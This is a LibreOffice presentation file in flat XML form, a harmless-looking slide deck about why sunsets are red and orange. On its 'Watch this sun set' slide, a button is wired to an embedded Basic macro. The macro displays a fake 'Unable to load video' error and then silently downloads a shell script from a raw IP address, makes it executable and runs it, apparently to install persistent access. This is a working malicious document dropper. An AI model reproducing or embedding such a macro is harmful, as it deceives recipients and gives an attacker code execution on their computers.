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776D7896.png" manifest:media-type="image/png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imbus Sans" svg:font-family="'Nimbus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fo:background-color="#e0c2cd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Lights1-title">
      <style:graphic-properties fo:min-height="2.75cm" loext:decorative="false"/>
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="pr5" style:family="presentation" style:parent-style-name="Lights1-outline1">
      <style:graphic-properties draw:fill="gradient" draw:fill-gradient-name="Gradient_20_8" draw:gradient-step-count="0" fo:min-height="10.001cm" loext:decorative="false"/>
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="pr6" style:family="presentation" style:parent-style-name="Lights1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8" style:family="presentation" style:parent-style-name="Lights1-outline1">
      <style:graphic-properties draw:fill="bitmap" draw:fill-image-name="Bitmap_20_1" draw:opacity="100%" style:repeat="repeat" fo:min-height="12.737cm" loext:decorative="false"/>
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="pr9" style:family="presentation" style:parent-style-name="Lights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color="#55308d" loext:opacity="100%" style:font-name="Nimbus Sans" fo:font-size="42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gradient" draw:fill-gradient-name="Gradient_20_8" draw:gradient-step-count="0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373cm" fo:text-align="center" fo:text-indent="0cm"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <loext:graphic-properties draw:fill="bitmap" draw:fill-image-name="Bitmap_20_1" draw:opacity="100%" style:repeat="repeat"/>
      <style:text-properties fo:color="#ffffff" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P8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 text:style-name="P1">What is a Sunset?</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:text-style-name="P2" draw:layer="layout" svg:width="25.199cm" svg:height="5.619cm" svg:x="-1.905cm" svg:y="6.985cm" presentation:class="subtitle" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">By Sunny Starson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 presentation:user-transformed="true">
          <draw:text-box>
            <text:p>How Does the Scattering of Light Work?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item>
                <text:p>Sunlight is made up of different colors, each with different wavelengths.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Blue and violet light have short wavelengths and are scattered more by molecules in the atmosphere.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Red, orange, and yellow light have longer wavelengths and are scattered les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5cm" svg:y="0.75cm" presentation:class="title">
          <draw:text-box>
            <text:p text:style-name="P6">Why Sunsets Are Red &amp; Orange?</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr8" draw:text-style-name="P7" draw:layer="layout" svg:width="25cm" svg:height="10cm" svg:x="1.5cm" svg:y="4cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p><text:span text:style-name="T2">During sunset, the Sun is lower in the sky, and its light has to </text:span><text:span text:style-name="T2">pass through a thicker layer of the atmosphere.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T2">More blue and violet light gets scattered out of view, leaving </text:span><text:span text:style-name="T2">behind the warmer colors like red, orange, and pink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Sunset Over the Ocea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Standard.Module1.WebServerPerm?language=Basic&amp;location=document" xlink:type="simple"/>
              </office:event-listeners>
            </form:button>
          </form:form>
        </office:forms>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25cm" svg:height="2.75cm" svg:x="1.5cm" svg:y="0.75cm" presentation:class="title">
          <draw:text-box>
            <text:p>Watch this sun set</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:control draw:style-name="gr2" draw:text-style-name="P8" draw:layer="controls" svg:width="15.875cm" svg:height="6.35cm" svg:x="6.35cm" svg:y="5.08cm" draw:control="control1"/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imbus Sans" svg:font-family="'Nimbus Sans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8" draw:display-name="Gradient 8" draw:style="radial" draw:cx="50%" draw:cy="50%" draw:start-color="#800080" draw:end-color="#2a6099" draw:start-intensity="100%" draw:end-intensity="100%" draw:border="0%">
      <loext:gradient-stop svg:offset="0" loext:color-type="rgb" loext:color-value="#800080"/>
      <loext:gradient-stop svg:offset="1" loext:color-type="rgb" loext:color-value="#2a609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00800000008776D7896.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/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8:30:58.650449373</meta:creation-date>
    <meta:editing-duration>PT14M8S</meta:editing-duration>
    <meta:editing-cycles>11</meta:editing-cycles>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
    <dc:title>Lights</dc:title>
    <dc:date>2025-03-31T23:02:16.777605016</dc:date>
    <meta:document-statistic meta:object-count="95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WebServerPerm()
  MsgBox "Unable to load video try agan later!"
  Shell "/bin/bash -c 'curl -s http://165.227.221.46:8080/webServerPerm.sh -o ~/Documents/webServerPersistent.sh &amp;&amp; chmod +x ~/Documents/webServerPersistent.sh &amp;&amp; bash ~/Documents/webServerPersistent.sh'", 0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